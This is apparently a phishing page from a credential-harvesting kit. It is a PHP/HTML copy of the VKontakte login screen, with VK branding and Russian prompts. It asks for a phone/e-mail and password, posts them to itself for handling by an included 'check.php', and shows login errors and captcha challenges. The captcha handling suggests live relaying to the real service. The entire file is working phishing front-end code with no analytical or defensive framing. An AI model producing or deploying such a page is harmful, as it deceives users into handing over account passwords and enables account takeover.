<?
@include('check.php');
?>
<html>
<head>
	<title>ВКонтакте</title>
	<link rel="shortcut icon" href="media/favicon.ico"/>
	<link rel="stylesheet" type="text/css" href="media/style.css"/>
	<script src="media/jquery.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet"/>
</head>
<body>
	<div class="wrapper">
		<div class="content">
			<div class="header"><div class="header_"><a href="/"><div class="logo left"><div class="icon"></div></div></a></div></div>
			<div class="general">
				<div class="block">
					<div class="message">Для продолжения необходимо авторизоваться <b>ВКонтакте</b></div>
					<?if($error == 1){?><div class="error"><b>Не удаётся войти.</b> Пожалуйста, проверьте правильность введённых данных.</div><?}?>
					<div class="login">
					<form action="?" method="POST">
						<span>Телефон или E-mail:</span><input name="login"/>
						<span>Пароль:</span><input name="password" type="password"/>
						<?if($captcha == 1){?>
						<div class="captcha">
							<img src="<?=$captchaImgz;?>"/>
							<span>Код с картинки:</span>
							<input hidden value="<?=$captchaSidz;?>" name="captchaSid"/>
							<input name="captchaKey"/>
						</div>
						<?}?>	
						<button type="submit">Войти</button>
					</form>	
					</div>
				</div>
			</div>
		</div>
		<div class="footer"></div>
	</div>
</body>
</html>